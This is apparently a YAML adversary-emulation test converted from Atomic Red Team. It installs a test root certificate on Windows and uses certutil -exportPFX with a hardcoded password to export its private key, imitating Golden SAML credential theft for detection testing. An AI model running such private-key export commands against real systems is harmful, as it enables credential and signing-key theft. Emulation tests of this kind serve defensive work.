# Converted from Atomic Red Team - Unsecured Credentials: Private Keys
# Source: https://www.atomicredteam.io/atomic-red-team/atomics/T1552.004
# Original auto_generated_guid: 336b25bf-4514-4684-8924-474974f28137

---
api_version: 2.0
uuid: c46d882d-1df1-48e2-bd47-53ddff4bff95
name: CertUtil ExportPFX
authors:
  - isaac_fletcher
  - Atomic Red Team
description: |
  The following Atomic test simulates adding a generic non-malicious certificate to the Root certificate store. This behavior generates a registry modification that adds the cloned root CA certificate in the keys outlined in the blog. In addition, this Atomic utilizes CertUtil to export the PFX (ExportPFX), similar to what was seen in the Golden SAML attack.
  Keys will look like - \SystemCertificates\CA\Certificates or \SystemCertificates\Root\Certificates
  Reference: https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec
  Reference: https://www.splunk.com/en_us/blog/security/a-golden-saml-journey-solarwinds-continued.html

mitre:
  tactics:
    - "TA0006 Credential Access"
  techniques:
    - "T1552 Unsecured Credentials"
  subtechniques:
    - "T1552.004 Private Keys"

requirements:
  platforms:
    - os: windows
  superuser: true

args:
  - name: cert_script_path
    description: Path to RemoteCertTrust.ps1 script
    type: path
    default: "./RemoteCertTrust.ps1"
  - name: output
    description: file path to export to
    type: path
    default: "C:\\Windows\\Temp\\atomic.pfx"
  - name: password
    description: password for cert
    type: string
    default: "password"

steps:
  - name: ensure_cert_script_exists
    executor: powershell
    inline: |
      if (-not (Test-Path "{{.Args.cert_script_path}}")) {
        Write-Error "RemoteCertTrust.ps1 script not found at {{.Args.cert_script_path}}. Exiting..."
        exit 1
      }

  - name: export_certificate_with_certutil
    executor: powershell
    inline: |
      . "{{.Args.cert_script_path}}"
      certutil.exe -p {{.Args.password}} -exportPFX Root 1F3D38F280635F275BE92B87CF83E40E40458400 {{.Args.output}}
    cleanup:
      executor: cmd
      inline: |
        powershell.exe -c "Get-ChildItem -Path Cert:\ -Recurse | Where-Object { $_.Thumbprint -eq '1F3D38F280635F275BE92B87CF83E40E40458400' } | Remove-Item -ErrorAction Ignore -Force -Confirm:$false"
